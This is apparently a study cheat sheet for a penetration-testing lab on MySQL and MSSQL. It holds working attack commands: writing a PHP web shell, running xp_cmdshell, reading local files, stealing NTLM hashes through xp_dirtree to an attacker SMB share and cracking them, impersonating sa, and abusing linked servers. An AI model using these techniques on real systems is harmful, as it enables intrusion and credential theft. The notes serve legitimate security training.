---

---

Enumerate the "flagDB" database and submit a flag as your answer.

What is the password for the "mssqlsvc" user?

10.129.17.18

# SQL

## Connect

```bash
# MySQL
mysql -u julio -pPassword123 -h 10.129.20.13

# MSSQL
# Win
c:\> sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30

# Lin
sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h
# SERVERNAME\\accountname or .\\accountname for local
sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h
# Alt
mssqlclient.py -p 1433 julio@10.129.203.7 
```

## SQL Syntax

### Database data

show db -> use db -> -> sh tbl - get tbl data

```sql
# MySQL
SHOW DATABASES;
USE htbusers;
SHOW TABLES;
SELECT * FROM users;

# MSSQL
SELECT name FROM master.dbo.sysdatabases
USE htbusers
SELECT table_name FROM htbusers.INFORMATION_SCHEMA.TABLES
1> SELECT * FROM tb_flag
2> go
```

### Command execution

```sql
# MySQL
show variables like "secure_file_priv"; # Check if empty
SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';

# MSSQL
1> xp_cmdshell 'whoami'
2> GO

output
-----------------------------
no service\mssql$sqlexpress
NULL
(2 rows affected)
```

### Read local files

```sql
# MySQL
mysql> select LOAD_FILE("/etc/passwd");

# MSSQL
1> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
2> GO
```

## Capture MSSQL Service Hash

Start [Responder](https://github.com/lgandx/Responder) or [impacket-smbserver](https://github.com/SecureAuthCorp/impacket)

```bash
sudo responder -I tun0

sudo impacket-smbserver share ./ -smb2support

# Crack it
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

```mssql
# XP_DIRTREE Hash Stealing
1> EXEC master..xp_dirtree '\\10.10.110.17\share\'
2> GO

#XP_SUBDIRS Hash Stealing
1> EXEC master..xp_subdirs '\\10.10.110.17\share\'
2> GO
```

## Impersonate Existing Users with MSSQL

Sysadmins can impersonate anyone by default, But for non-administrator users, privileges must be explicitly assigned.

```mssql
# Identify users
1> SELECT distinct b.name
2> FROM sys.server_permissions a
3> INNER JOIN sys.server_principals b
4> ON a.grantor_principal_id = b.principal_id
5> WHERE a.permission_name = 'IMPERSONATE'
6> GO

name
-----------------------------------------------
sa
ben
valentin

# Verify current user and role
1> SELECT SYSTEM_USER
2> SELECT IS_SRVROLEMEMBER('sysadmin')
3> go

-----------
julio                                                                                                                    

(1 rows affected)

-----------
          0 # No sysadmin role go for sa

# Impersonate sa
1> EXECUTE AS LOGIN = 'sa'
2> SELECT SYSTEM_USER
3> SELECT IS_SRVROLEMEMBER('sysadmin')
4> GO

-----------
sa

(1 rows affected)

-----------
          1
          

```

## MSSQL - [Linked Servers](https://docs.microsoft.com/en-us/sql/relational-databases/linked-servers/create-linked-servers-sql-server-database-engine)

```mssql
# Identify - 1 is remote 2 is linked
1> SELECT srvname, isremote FROM sysservers
2> GO

srvname                             isremote
----------------------------------- --------
DESKTOP-MFERMN4\SQLEXPRESS          1
10.0.0.12\SQLEXPRESS                0

# Get user and privs
1> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
2> GO

DESKTOP-0L9D4KA\SQLEXPRESS     Microsoft SQL Server 2019 (RTM sa_remote   1
```

## Vulns

- MMSQL - SMB relay or xp_dirtree

